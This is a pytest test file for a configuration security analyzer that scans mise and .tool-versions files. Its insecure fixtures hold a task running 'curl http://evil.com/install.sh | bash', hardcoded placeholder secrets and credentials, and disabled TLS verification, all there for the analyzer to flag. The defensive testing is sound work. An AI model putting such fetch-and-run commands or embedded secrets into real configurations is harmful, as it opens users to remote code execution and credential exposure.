"""Tests for MiseAnalyzer."""

from pathlib import Path

from devai.mise_analyzer import MiseAnalyzer, MiseFinding


INSECURE_MISE_TOML = """\
[tools]
node = "latest"
python = "system"
terraform = "1.10.3"

[env]
API_KEY = "hardcoded-secret-token-12345"
DATABASE_PASSWORD = "super-secret-password"

[settings]
experimental = true

[tasks.setup]
run = "curl http://evil.com/install.sh | bash"

[plugins]
my-plugin = "git+https://user:pass@github.com/private/mise-plugin.git#main"
"""

INSECURE_TOOL_VERSIONS = """\
# Insecure tool versions
nodejs latest
python system
ruby 3.3.0
terraform 1.10.3
"""

INSECURE_RTX_TOML = """\
[tools]
go = "head"

[env]
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
GIT_SSL_NO_VERIFY = "1"
"""

HARDENED_MISE_TOML = """\
[tools]
node = "22.12.0"
python = "3.12.8"
terraform = "1.10.3"
ruby = "3.3.6"

[env]
# Secrets loaded from the environment at runtime
NODE_ENV = "development"

[tasks.test]
run = "pytest"
"""

HARDENED_TOOL_VERSIONS = """\
nodejs 22.12.0
python 3.12.8
terraform 1.10.3
"""


class TestMiseAnalyzer:
    def test_detects_insecure_mise_toml(self, tmp_path: Path):
        (tmp_path / ".mise.toml").write_text(INSECURE_MISE_TOML, encoding="utf-8")
        analyzer = MiseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()

        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "unpinned_version" in kinds
        assert "scm_credentials" in kinds
        assert "curl_pipe_shell" in kinds or "insecure_http" in kinds
        assert analyzer.health_score() < 50.0
        assert analyzer.stats.files == 1
        assert len(analyzer.infos[0].tools) >= 3

    def test_detects_insecure_tool_versions(self, tmp_path: Path):
        (tmp_path / ".tool-versions").write_text(INSECURE_TOOL_VERSIONS, encoding="utf-8")
        analyzer = MiseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()

        kinds = {f.kind for f in findings}
        assert "unpinned_version" in kinds
        assert analyzer.stats.files == 1
        assert len(analyzer.infos[0].tools) >= 3

    def test_detects_insecure_rtx_toml(self, tmp_path: Path):
        (tmp_path / ".rtx.toml").write_text(INSECURE_RTX_TOML, encoding="utf-8")
        analyzer = MiseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()

        kinds = {f.kind for f in findings}
        assert "aws_access_key" in kinds
        assert "tls_verify_disabled" in kinds

    def test_hardened_configs_score_well(self, tmp_path: Path):
        (tmp_path / ".mise.toml").write_text(HARDENED_MISE_TOML, encoding="utf-8")
        (tmp_path / ".tool-versions").write_text(HARDENED_TOOL_VERSIONS, encoding="utf-8")

        analyzer = MiseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()

        assert findings == []
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.files == 2

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = MiseAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.configs == 0
        assert "none found" in analyzer.summary()

    def test_generate_hardened_config(self):
        analyzer = MiseAnalyzer(".")
        config = analyzer.generate_hardened_config()
        assert "node" in config
        assert "python" in config
        assert "hardcode" not in config.lower() or "never hardcode" in config.lower()

    def test_to_context_includes_findings(self, tmp_path: Path):
        (tmp_path / ".mise.toml").write_text(INSECURE_MISE_TOML, encoding="utf-8")
        analyzer = MiseAnalyzer(str(tmp_path))
        context = analyzer.to_context()

        assert "Mise analysis:" in context
        assert "health score:" in context
        assert "hardcoded_secret" in context or "high" in context

    def test_finding_format(self):
        finding = MiseFinding(
            kind="hardcoded_secret",
            severity="high",
            message="test message",
            path="test.toml",
            lineno=1,
        )
        assert "[high]" in finding.format()
        assert "test.toml:1" in finding.format()
